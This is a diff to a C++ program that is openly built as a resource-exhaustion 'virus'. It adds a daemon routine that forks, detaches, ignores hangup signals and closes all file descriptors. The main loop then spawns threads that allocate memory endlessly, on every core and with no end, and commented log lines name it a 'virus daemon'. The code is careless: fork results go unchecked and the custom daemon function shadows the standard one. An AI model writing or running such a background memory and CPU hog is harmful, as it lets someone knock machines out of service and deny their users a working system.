@@ -4,11 +4,54 @@
 #include <vector>
 #include <fstream>
 #include <iostream>
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <syslog.h>
 
 // hogs all the memory, including virtual ram
 void decl()
 {
 	while (true) std::array<uint64_t,2> *test = new std::array<uint64_t, 2>[3000];
+}
+
+
+
+static void daemon()
+{
+    pid_t pid;
+
+    /* Fork off the parent process */
+    pid = fork();
+
+
+    /* Catch, ignore and handle signals */
+    //TODO: Implement a working signal handler
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
+    /* Fork off for the second time*/
+    pid = fork();
+
+
+    /* set new file permissions */
+    umask(0);
+
+    /* change the working directory to the root directory */
+    /* or another appropriated directory */
+    chdir("/");
+
+    /* close all open file descriptors */
+    int x;
+    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
+    {
+        close (x);
+    }
+
+    /* open the log file */
+    openlog ("firstdaemon", LOG_PID, LOG_DAEMON);
 }
 
 // hogs all the cpu's
@@ -41,10 +84,23 @@ int main()
     const size_t thr_count = std::thread::hardware_concurrency();
 	std::vector<std::thread> threads(thr_count);
 
-    // iterate through all threads, will work even if the amount of threads is larger than the amount
-    // of threads
-    for(uint32_t i=0;i<thr_count;i++) threads[i] = std::thread(decl);
-    for(uint32_t i=0;i<thr_count;i++) threads[i].join();
+	
+    daemon();
+
+    while (1)
+    {
+    	// iterate through all threads, will work even if the amount of threads is larger than the amount
+    	for(uint32_t i=0;i<thr_count;i++) threads[i] = std::thread(decl);
+    	for(uint32_t i=0;i<thr_count;i++) threads[i].join();
+
+        //syslog (LOG_NOTICE, "first virus daemon started");
+        //sleep (120);
+        //break;
+    }
+
+    //syslog (LOG_NOTICE, "first daemon virus terminated");
+    //closelog();
+
 	return 0;
 }
 
